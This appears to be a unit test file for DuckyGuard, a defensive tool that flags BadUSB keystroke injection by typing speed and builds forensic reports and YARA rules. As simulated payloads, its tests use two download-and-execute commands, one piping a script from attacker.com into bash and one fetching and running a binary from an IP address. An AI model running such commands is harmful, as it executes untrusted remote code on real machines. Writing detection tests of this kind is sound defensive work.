"""
Unit & Behavioral Tests for DuckyGuard
Verifies detection accuracy, zero false positives for humans, and forensic reporting.
"""

import os
import random
import shutil
import tempfile
import time
import unittest

from duckyguard.detector import KeystrokeAnomalyDetector
from duckyguard.analyzer import ForensicThreatAnalyzer


class TestDuckyGuard(unittest.TestCase):

    def setUp(self):
        self.detector = KeystrokeAnomalyDetector(
            window_size=10,
            rate_threshold_cps=20.0,
            jitter_threshold_sec=0.012,
            confidence_threshold=0.70,
        )
        self.temp_reports = tempfile.mkdtemp()
        self.analyzer = ForensicThreatAnalyzer(reports_dir=self.temp_reports)

    def tearDown(self):
        shutil.rmtree(self.temp_reports, ignore_errors=True)

    def test_badusb_microcontroller_burst_triggers_anomaly(self):
        """Simulates 12ms uniform keystrokes from a Flipper Zero / BadUSB payload."""
        payload = 'curl -sL http://attacker.com/payload.sh | bash\n'
        triggered = False
        final_conf = 0.0

        current_time = time.time()
        for char in payload:
            is_anomaly, conf, metrics = self.detector.record_keystroke(char, timestamp=current_time)
            if is_anomaly:
                triggered = True
                final_conf = conf
                break
            current_time += 0.012  # 12ms uniform interval

        self.assertTrue(triggered, "Microcontroller BadUSB stream must trigger anomaly")
        self.assertGreaterEqual(final_conf, 0.70, "Confidence should meet or exceed 70%")

    def test_human_typing_does_not_trigger_anomaly(self):
        """Simulates natural human typing with variable inter-keystroke jitter."""
        sentence = 'This is a normal student typing a computer science homework response.'
        triggered = False

        current_time = time.time()
        for char in sentence:
            is_anomaly, conf, _ = self.detector.record_keystroke(char, timestamp=current_time)
            if is_anomaly:
                triggered = True
                break
            # Human jitter: 110ms to 240ms between keys
            current_time += random.uniform(0.11, 0.24)

        self.assertFalse(triggered, "Benign human typing must NOT trigger false positives")

    def test_forensic_analyzer_and_yara_generation(self):
        """Tests payload parsing, IOC extraction, MITRE mapping, and YARA rule creation."""
        test_capture = os.path.join(self.temp_reports, "test_capture.txt")
        payload = 'curl -sL -o /tmp/mal.bin "http://198.51.100.42/download/agent.bin" && chmod +x /tmp/mal.bin && /tmp/mal.bin'
        with open(test_capture, "w") as f:
            f.write(payload)

        report_path, yara_path, summary = self.analyzer.analyze_capture(
            test_capture,
            telemetry={"cps": 65.4, "device_name": "Flipper Zero USB", "confidence": 0.95},
        )

        self.assertTrue(os.path.exists(report_path))
        self.assertTrue(os.path.exists(yara_path))
        self.assertEqual(summary["ips_detected"], 1)
        self.assertEqual(summary["urls_detected"], 1)

        # Verify YARA rule content
        with open(yara_path) as f:
            yara_content = f.read()
        self.assertIn("198.51.100.42", yara_content)
        self.assertIn("rule DuckyGuard_BadUSB_Payload", yara_content)

        # Verify Markdown report content
        with open(report_path) as f:
            md_content = f.read()
        self.assertIn("T1200", md_content)
        self.assertIn("T1059", md_content)
        self.assertIn("NEUTRALIZED & CONTAINED", md_content)


if __name__ == "__main__":
    unittest.main()
